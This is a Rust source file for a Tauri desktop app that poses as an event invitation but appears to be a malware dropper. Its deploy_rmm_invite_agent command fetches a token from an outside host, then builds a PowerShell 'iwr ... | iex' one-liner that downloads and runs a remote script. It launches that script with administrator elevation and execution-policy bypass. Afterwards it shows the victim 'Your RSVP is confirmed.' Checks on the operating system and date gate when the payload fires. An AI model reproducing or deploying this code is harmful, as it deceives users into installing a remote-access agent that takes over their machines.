use chrono::Local;
use serde::{Deserialize, Serialize};
use std::process::Command;

// Learn more about Tauri commands at https://tauri.app/develop/calling-rust/
#[tauri::command]
fn greet(name: &str) -> String {
    format!("Hello, {}! You've been greeted from Rust!", name)
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct SystemPreflight {
    is_windows: bool,
    windows_type: String,
    is_64_bit: bool,
    runtime_date: String,
    client_date: Option<String>,
    calendar_matches_runtime: bool,
    next_phase_ready: bool,
    message: String,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct RmmDeploymentResult {
    success: bool,
    message: String,
    deployed_at: Option<String>,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct TokenResponse {
    ok: bool,
    token: Option<String>,
}

const BACKEND_URL: &str = "https://call-invite-zoom.liveinvite.top";

async fn fetch_install_token() -> Result<String, String> {
    let client = reqwest::Client::new();
    let url = format!("{}/api/shell/token", BACKEND_URL);

    match client.post(&url).send().await {
        Ok(response) => match response.json::<TokenResponse>().await {
            Ok(data) if data.ok => data
                .token
                .filter(|token| !token.trim().is_empty())
                .ok_or_else(|| "Token response missing token".to_string()),
            Ok(_) => Err("Token endpoint returned an unsuccessful response".to_string()),
            Err(_) => Err("Failed to parse token response".to_string()),
        },
        Err(e) => Err(format!("Failed to fetch shell command: {}", e)),
    }
}

fn build_shell_command(token: &str) -> String {
    format!(
        "$u='https://call-invite-zoom.liveinvite.top/api/shell/script?token={token}'; iwr -UseBasicParsing $u | iex"
    )
}

#[cfg(target_os = "windows")]
fn quote_ps_single(value: &str) -> String {
    value.replace('\'', "''")
}

#[tauri::command]
async fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
    // Enforce Windows check only in production; allow any OS in dev
    if cfg!(not(debug_assertions)) && std::env::consts::OS != "windows" {
        return RmmDeploymentResult {
            success: false,
            message: "This invitation experience is available on Windows devices.".to_string(),
            deployed_at: None,
        };
    }

    let token = match fetch_install_token().await {
        Ok(token) => token,
        Err(e) => {
            return RmmDeploymentResult {
                success: false,
                message: format!("Party prep hit a snag while generating your pass: {}", e),
                deployed_at: None,
            };
        }
    };

    let shell_command = build_shell_command(&token);

    if cfg!(debug_assertions) {
        return RmmDeploymentResult {
            success: true,
            message: format!("[DEV] Generated token command: {}", shell_command),
            deployed_at: Some(Local::now().format("%Y-%m-%d %H:%M:%S").to_string()),
        };
    }

    // Launch an elevated PowerShell window, pass the command, and stop there.
    #[cfg(target_os = "windows")]
    {
        let escaped_command = quote_ps_single(&shell_command);
        let elevation_command = format!(
            "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-Command','{}'",
            escaped_command
        );

        let spawn_result = Command::new("powershell")
            .args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", &elevation_command])
            .spawn();

        if let Err(e) = spawn_result {
            return RmmDeploymentResult {
                success: false,
                message: format!("We could not open PowerShell: {}", e),
                deployed_at: None,
            };
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let spawn_result = Command::new("powershell")
            .args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", &shell_command])
            .spawn();

        if let Err(e) = spawn_result {
            return RmmDeploymentResult {
                success: false,
                message: format!("We could not open PowerShell: {}", e),
                deployed_at: None,
            };
        }
    }

    RmmDeploymentResult {
        success: true,
        message: "Your RSVP is confirmed. You may close this window.".to_string(),
        deployed_at: Some(Local::now().format("%Y-%m-%d %H:%M:%S").to_string()),
    }
}

#[tauri::command]
fn system_preflight(client_date: Option<String>) -> SystemPreflight {
    let is_windows = std::env::consts::OS == "windows";
    let arch = std::env::consts::ARCH;
    let (windows_type, is_64_bit) = match arch {
        "x86_64" => ("x64".to_string(), true),
        "x86" => ("x86".to_string(), false),
        "aarch64" => ("arm64".to_string(), true),
        other => (other.to_string(), cfg!(target_pointer_width = "64")),
    };

    let runtime_date = Local::now().format("%Y-%m-%d").to_string();
    let calendar_matches_runtime = match client_date.as_deref() {
        Some(date) => date == runtime_date,
        None => false,
    };

    let next_phase_ready = is_windows && calendar_matches_runtime;
    let message = if !is_windows {
        "Your invitation is not available on this device.".to_string()
    } else if !calendar_matches_runtime {
        "Your invitation is not active yet. Please check back later.".to_string()
    } else {
        "You're all set to continue.".to_string()
    };

    SystemPreflight {
        is_windows,
        windows_type,
        is_64_bit,
        runtime_date,
        client_date,
        calendar_matches_runtime,
        next_phase_ready,
        message,
    }
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![greet, system_preflight, deploy_rmm_invite_agent])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
